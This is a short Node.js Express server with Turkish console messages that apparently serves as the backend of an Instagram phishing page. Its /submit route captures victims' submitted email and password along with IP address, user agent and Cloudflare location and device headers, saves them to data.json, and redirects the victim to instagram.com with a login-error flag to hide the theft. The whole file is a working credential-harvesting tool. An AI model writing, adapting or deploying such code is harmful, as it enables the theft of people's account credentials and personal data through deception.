const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fs = require('fs');
const moment = require('moment');

/////////////////////////
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));


app.set('view engine', 'ejs');
app.use(express.static(__dirname + '/www'));
/////////////////////////

app.get('/', (req, res) => {
    res.render('index');
});

app.post('/submit', (req, res) => {
    let data = {
        email: req.body.email,
        password: req.body.password,
        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
        date: moment().format('DD/MM/YYYY HH:mm:ss'),
        userAgent: req.headers['user-agent'],
        country: req.headers['cf-ipcountry'], // Cloudflare
        city: req.headers['cf-icity'],
        isp: req.headers['cf-isp'],
        device: req.headers['cf-device-type'],
        os: req.headers['cf-os'],
        browser: req.headers['cf-browser'],
        browserVersion: req.headers['cf-browser-version']
    }
    fs.readFile('data.json', (err, file) => {
        if (err) {
            console.log(err);
        } else {
            let json = JSON.parse(file);
            json.push(data);
            fs.writeFile('data.json', JSON.stringify(json), (err) => {
                if (err) {
                    console.log(err);
                } else {
                    console.log('Kayıt başarılı.');
                }
            });
        }
    });
    
    res.redirect('https://instagram.com?login=error');
});

app.listen(80, () => {
    console.log('Web sunucusu başlatıldı. Port: 80');
});
